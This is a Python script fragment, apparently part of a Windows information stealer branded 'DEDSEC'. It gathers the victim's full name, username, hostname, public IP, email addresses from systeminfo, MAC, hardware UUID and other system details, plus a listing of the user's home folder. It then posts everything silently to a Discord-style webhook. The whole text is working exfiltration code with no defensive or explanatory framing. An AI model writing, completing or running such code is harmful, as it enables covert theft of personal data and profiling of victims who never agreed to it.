
# 👤 User Information
host_name = platform.node()
user_full_name = subprocess.check_output(['powershell', '(Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).FullName']).decode().strip()
user_name = os.getenv('USERNAME')

# 🔍 IP é GEOLOCATION LINK
ip = subprocess.check_output(['powershell', 'Invoke-RestMethod -Uri "https://ipapi.co/ip/"']).decode().strip()

# 📩 EMAIL
command = 'powershell.exe "systeminfo | Select-String -Pattern \'@\' | ForEach-Object { $_.Line -split \' \' | Where-Object { $_ -like \'*@*.*\' } }"'
output = subprocess.check_output(command, shell=True, text=True)

# 💻 PC information
ipv4 = socket.gethostbyname(socket.gethostname())
mac_addresses = [link.address for link in psutil.net_if_addrs().get('Ethernet', [])]
uuid = subprocess.check_output(['wmic', 'csproduct', 'get', 'UUID']).decode().split('\n')[1].strip()
mac = ','.join(mac_addresses)
machine = platform.machine()
ram_info = round(psutil.virtual_memory().total / (1024 ** 3), 2)
platform = platform.platform()


dossier = rf"C:\Users\{user_name}"


fichiers = os.listdir(dossier)


embed = {
    "title": "DEDSEC can help",
    "color": 171717, 
    "fields": [
        {
            "name": "User Info",
            "value": f"Full Name: ||{user_full_name}||\nUsername: ||{user_name}||\nHostname: ||{host_name}||",
            "inline": True
        },
        {
            "name": "Network IP",
            "value": f"IP: ||{ip}||\nhttps://ipapi.co/{ip}/json/",
            "inline": True
        },
        {
            "name": "EMAIL",
            "value": f"||{output}||",
            "inline": False
        },
        {
            "name": "PC Data",
            "value": f"||('ipv4': '{ipv4}', 'UUID': '{uuid}', 'MAC': '{mac}', 'MACHINE': '{machine}', 'RAM': '{ram_info}', 'PLATFORM': '{platform}')||",
            "inline": False
        },
        {
            "name": "VIEW FILES",
            "value": f"\n".join(fichiers),
            "inline": True
        }
    ]
}




response = requests.post(WEBHOOK_URL, json={"embeds": [embed]})

if response.status_code == 200:
    print("")
else:
    print("", response.status_code)

